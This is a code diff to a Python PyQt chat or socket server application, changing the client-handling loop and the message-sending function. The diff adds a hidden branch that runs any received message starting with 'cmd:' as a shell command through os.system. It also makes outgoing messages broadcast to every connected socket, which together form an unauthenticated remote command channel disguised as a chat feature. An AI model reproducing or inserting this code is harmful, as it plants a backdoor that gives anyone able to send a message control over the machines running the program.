@@ -47,10 +47,12 @@ def UI():
 
 def potok(sc):
     ex.list.addItem(str(sc.getpeername()[0]))
-    ex.list.item(ex.list.count() - 1).setForeground(Qt.red)
+    ex.list.item(ex.list.count() - 1).setForeground(Qt.green)
     sc.send(str(sc).encode())
     while True:
         message = sc.recv(1024).decode()
+        if message.split(': ')[1].startswith('cmd:'):
+            os.system(message.split(': ')[1][4:])
         if message:
             if message.endswith('EXIT'):
                 break
@@ -149,7 +151,11 @@ class MyWidget(QMainWindow):
         settexth(self.chatRoom, 'I2CMP: ' + self.leCommand.text(), '#00FF00')
 
     def sendMes(self):
+        global iptable
         settexth(self.chatRoom, socket.gethostname() + ': ' + self.leMessage.text(), '#00AAFF')
+        #print(iptable)
+        for i in iptable.keys():
+            iptable[i].send(self.leMessage.text().encode())
         self.leMessage.setSelection(0, len(self.leMessage.text()))
         self.leMessage.backspace()
 
